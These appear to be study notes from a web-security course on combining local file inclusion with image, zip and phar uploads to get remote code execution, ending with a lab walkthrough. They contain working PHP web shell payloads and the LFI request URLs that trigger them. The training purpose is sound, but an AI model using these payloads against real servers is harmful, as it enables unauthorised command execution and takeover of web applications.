
#  LFI and File Uploads

 >If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
 
 As mentioned in the first section, the following are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:
![[Pasted image 20230305185419.png]]

---
## Image upload
>Image upload is very common in most modern web applications, as uploading images is widely regarded as safe if the upload function is securely coded. However, as discussed earlier, the vulnerability, in this case, is not in the file upload form but the file inclusion functionality.

#### Crafting Malicious Image
First we will create malicious image we can either get any picture and append our code inside of it or give it magic bytes in the beginning to turn it's format to image (e.g. GIF8) is magic byte of GIF files just in case the upload form checks for both the extension and content type as well. We can do so as follows:
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
>This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.


#### Uploaded File Path
>Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```
If we can't see where the image gets uploaded we can try to FUZZ for the uploaded image
With the uploaded file path at hand, all we need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed, as follows we use lfi to access the .gif file:
![[Pasted image 20230305190330.png]]

## Zip Upload
>We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:


```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:

![[Pasted image 20230305190624.png]]

---
## Phar Upload
we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
>This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:


```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://`
`http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`
![[Pasted image 20230305190930.png]]

---
## Exercise
**Use any of the techniques covered in this section to gain RCE and read the flag at /**

![[Pasted image 20230305191129.png]]
Download any image 
![[Pasted image 20230305191201.png]]
![[Pasted image 20230305191255.png]]
appending our shell to the image file then upload it
```php
<?php system($_GET["cmd"]); ?>
```
![[Pasted image 20230305191248.png]]

source code reveal image path
![[Pasted image 20230305191410.png]]
try our LFI
`http://157.245.32.224:30109/index.php?language=./profile_images/default.jpg&cmd=id`
![[Pasted image 20230305191545.png]]
then go to the end of the file in view source
![[Pasted image 20230305191602.png]]

### Using GIF
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
![[Pasted image 20230305191656.png]]

and then upload it
![[Pasted image 20230305191739.png]]
`http://157.245.32.224:30109/index.php?language=./profile_images/shell.gif&cmd=id`
![[Pasted image 20230305191804.png]]
`view-source:157.245.32.224:30109/index.php?language=./profile_images/shell.gif&cmd=ls%20-la%20/`
![[Pasted image 20230305191921.png]]
![[Pasted image 20230305192010.png]]

---
Tags:
Resources:
[LFI_With_PHPInfo_Assistance.pdf](https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf)
[LFI_With_PHPInf]( https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
